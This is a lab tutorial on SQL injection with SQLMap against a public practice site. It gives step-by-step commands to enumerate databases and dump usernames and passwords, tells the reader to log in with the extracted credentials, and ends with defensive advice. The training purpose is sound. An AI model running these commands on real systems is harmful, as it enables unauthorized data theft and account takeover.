Procedure

Step 1: Install SQLMap

SQLMap comes pre-installed in Kali Linux. However, if it is not installed, you can install it using the following command:

            sudo apt-get update
            sudo apt-get install sqlmap

Type the above command in the terminal to install SQLMap.

Step 2: Verify SQLMap Installation

To ensure SQLMap is installed correctly, check its version:

            sqlmap --version

This should display the installed SQLMap version.

Step 3: Identify SQL Injection Vulnerabilities

Use SQLMap to check if a target URL is vulnerable to SQL Injection:

            sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"

If the website is vulnerable, SQLMap will indicate the presence of an SQL Injection vulnerability.

Step 4: List Available Databases

Once a vulnerability is found, retrieve the list of databases on the target system:

            sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs

This command lists all available databases on the target server.

Step 5: List Tables in a Database

To retrieve the tables inside a specific database (e.g., `acuart`), use:

            sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables

This command lists all tables inside the `acuart` database.

Step 6: Retrieve Columns in a Table

To view the column names inside a table (e.g., `users`), run:

            sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns

This command lists all the columns inside the `users` table.

Step 7: Extract Usernames

To extract usernames from the `users` table, use:

            sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C name --dump

This command retrieves all stored usernames in the database.

Step 8: Extract Passwords

To extract passwords from the `users` table, use:

            sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C pass --dump

This command retrieves all stored passwords in the database.

Step 9: Attempt Login with Extracted Credentials

After extracting login credentials, use them to log into the target system.

For example, if the retrieved credentials are:

            Username: admin
            Password: admin123

Use these credentials on the login page of the target application.

Example Output

After executing the above commands, you may see output like this:

            Database: acuart
            Table: users
            +----+--------+----------+
            | ID | name   | pass     |
            +----+--------+----------+
            | 1  | admin  | admin123 |
            | 2  | user1  | userpass |
            +----+--------+----------+

Explanation:

  • Database: acuart - The database that was targeted.
  • Table: users - The table that contains user credentials.
  • Username and Passwords: Retrieved credentials for authentication.

Step 10: Secure Against SQL Injection

To protect against SQL Injection, developers should:

  • Use Prepared Statements to avoid SQL concatenation.
  • Sanitize and Validate Input before passing it to the database.
  • Limit User Privileges to prevent unauthorized access.
  • Use Web Application Firewalls (WAFs) to detect and block SQL injection attempts.

By implementing these security measures, developers can protect their web applications from SQL Injection attacks.
